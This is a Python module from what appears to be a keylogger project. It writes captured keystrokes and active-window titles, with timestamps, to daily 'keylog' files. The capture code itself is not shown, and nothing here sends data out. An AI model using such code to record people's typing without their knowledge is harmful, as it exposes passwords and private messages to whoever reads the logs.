from pathlib import Path
from datetime import datetime
from src.events import KeyEvent, WindowEvent


class LogWriteError(Exception):
    """Raised when a log file cannot be written."""


class FileLogger:
    """Writes KeyEvent and WindowEvent instances to a daily log file."""

    def __init__(self, logs_dir: str = "logs"):
        self._logs_dir = Path(logs_dir)
        self._logs_dir.mkdir(parents=True, exist_ok=True)

    # ------------------------------------------------------------------
    # Public interface
    # ------------------------------------------------------------------

    def start_session(self) -> None:
        """Write a session-start header to today's log file."""
        self._write_raw(
            f"=== Session started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n\n"
        )

    def end_session(self) -> None:
        """Write a session-end footer to today's log file."""
        self._write_raw(
            f"\n=== Session ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n"
        )

    def write_event(self, event) -> None:
        """Format and append a single event to today's log file."""
        line = self._format_event(event)
        if line:
            self._write_raw(line + "\n")

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _get_log_path(self) -> Path:
        date_str = datetime.now().strftime("%Y-%m-%d")
        return self._logs_dir / f"keylog_{date_str}.log"

    def _format_event(self, event) -> str:
        if isinstance(event, KeyEvent):
            return f"[{event.timestamp}] {event.key}"
        if isinstance(event, WindowEvent):
            return f"\n--- [{event.title}] @ {event.timestamp} ---\n"
        return ""

    def _write_raw(self, text: str) -> None:
        try:
            with open(self._get_log_path(), "a", encoding="utf-8") as fh:
                fh.write(text)
        except PermissionError as exc:
            raise LogWriteError(f"Cannot write to log file: {exc}") from exc
